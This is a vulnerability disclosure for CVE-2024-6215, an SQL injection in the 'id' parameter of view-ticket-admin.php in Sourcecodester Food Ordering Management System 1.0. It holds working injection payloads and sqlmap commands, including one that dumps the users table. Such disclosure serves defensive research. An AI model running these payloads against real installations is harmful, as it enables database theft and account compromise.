# SQL Injection vulnerability was discovered from Sourcecodester Food Ordering Management System 1.0 (view-ticket-admin.php)
## CVE-2024-6215

Affected Project: Sourcecodester Food Ordering Management System 1.0
Official Website: https://www.sourcecodester.com/php/15689/food-ordering-management-system-php-and-mysql-free-source-code.html
Version: 1.0

Related Code file: view-ticket-admin.php

Injection parameter: id


## Vulnerability Analysis

1. Lack of Input Validation and Sanitization:
The id fields are directly used in the SQL query without any sanitization or validation. This allows an attacker to manipulate the SQL query by injecting malicious SQL code.

2. Use of Plain SQL Queries:
The script likely uses plain SQL queries to interact with the database. Without prepared statements, this approach is highly vulnerable to SQL injection.

## Demonstraation

Below is the view-ticket-admin.php:

`http://172.16.76.1/foms/view-ticket-admin.php`

![image](https://github.com/jadu101/CVE/assets/76433661/f00bf9b6-8a1f-4d34-b2dd-2c2616ef8c03)

We will first intercept the view-ticket traffic using Burp Suite:

![Screenshot from 2024-06-19 14-21-17](https://github.com/jadu101/CVE/assets/76433661/ca1c3344-5aac-479d-9813-f972980db5ea)

Save the intercepted request to a .txt file and execute sqlmap towards it. 

id price is vulnerable to boolean-based blind sql injection

Below commands verifies the vulnerability:

`sqlmap -r foms-view-ticket-admin.txt --batch`

![Screenshot from 2024-06-19 14-22-34](https://github.com/jadu101/CVE/assets/76433661/06552488-4803-4c06-a35e-f99d32a10de8)

```
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 5820=5820

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 1153 FROM (SELECT(SLEEP(5)))TJiA)

    Type: UNION query
    Title: Generic UNION query (NULL) - 8 columns
    Payload: id=-3013 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x7176716b71,0x674f514145744f534654486259594c6e6d63775669714f656656796b687747487963774273506755,0x716a6a6a71),NULL,NULL-- -
---
```

`sqlmap -r foms-view-ticket-admin.txt --batch --dbs`

![image](https://github.com/jadu101/CVE/assets/76433661/efe8ddc0-e9c0-4a8e-b51c-cd626365ce3b)

`sqlmap -r foms-view-ticket-admin.txt --batch --dbs -D foms_db -T users --dump`

![image](https://github.com/jadu101/CVE/assets/76433661/cad2be77-d4c7-45f6-b4ef-726d1a6e751f)
